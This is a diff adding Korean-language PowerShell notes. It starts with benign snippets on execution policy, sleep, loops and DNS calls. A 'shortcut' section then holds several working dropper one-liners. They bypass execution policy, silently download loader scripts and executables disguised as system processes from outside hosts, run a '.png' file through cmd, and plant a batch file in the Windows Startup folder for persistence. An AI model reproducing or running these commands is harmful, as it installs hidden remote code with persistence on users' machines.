@@ -1,0 +1,57 @@
+# 스크립트 파일 허용하기(1)
+
+PowerShell은 최초 설치시 보안 문제 때문에 기본적으로 ps1 스크립트 파일을 실행 할 수 없도록 설정되어 있습니다. 따라서 아래 명령을 통해 ps1 스크립트 파일을 실행할 수 있게 설정해야 합니다.
+
+	Set-ExecutionPolicy RemoteSigned
+
+	
+# 스크립트 파일 허용하기(2)
+	
+공유 폴더에 위치한 서명되지 않은 Powershell 스크립트를 실행하려면 다음과 같이 실행합니다.
+	
+	
+
+# 슬립(Sleep)
+
+	Start-Sleep -s 1;
+	Start-Sleep -m 1000;
+	
+	
+	
+# 반복문
+	while ($true)
+	{
+		echo System.Net.Dns.GetHostName();
+		Write-Host 'Hello World!';
+		Start-Sleep -s 1;
+	}
+
+
+# Static 메서드 호출하기
+
+	$dns = [System.Net.Dns]::GetHostName();
+    Write-Host $dns;
+
+
+# 바로가기
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy bypass (New-Object System.Net.WebClient).DownloadFile('http://where.0pe.kr/where/Loader.bat', '%TEMP%\Loader.bat'); cmd /c '%TEMP%\Loader.bat'
+
+
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy bypass Set-ExecutionPolicy RemoteSigned; (New-Object System.Net.WebClient).DownloadFile('http://where.0pe.kr/where/Loader.ps1', '%TEMP%\Loader.ps1'); powershell '%TEMP%\Loader.ps1'
+
+# Loader.ps1
+(New-Object System.Net.WebClient).DownloadFile('http://where.0pe.kr/where/SystemIdleProces.ps1', '%TEMP%\SystemIdleProces.ps1');
+(New-Object System.Net.WebClient).DownloadFile('http://where.0pe.kr/where/SystemIdleProces.exe', '%TEMP%\SystemIdleProces.exe');
+ cmd /c '%TEMP%\a.png'
+
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy bypass -windowstyle hidden Set-ExecutionPolicy RemoteSigned; (New-Object System.Net.WebClient).DownloadFile('http://where.0pe.kr/where/Loader.ps1', '%TEMP%\SystemIdleProcess.ps1'); (New-Object System.Net.WebClient).DownloadFile('http://where.0pe.kr/where/SystemIdleProcess.bat', 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\SystemIdleProcess.bat');cmd /c 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\SystemIdleProcess.bat'
+
+powershell.exe -ExecutionPolicy bypass -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('http://www.sharedit.co.kr/wp-content/uploads/2014/11/qqq8.png', '%TEMP%\a.png'); cmd /c '%TEMP%\a.png'
+
+
+
+
+powershell.exe -ExecutionPolicy bypass Write-Host 'Hello World!'
+
+
+
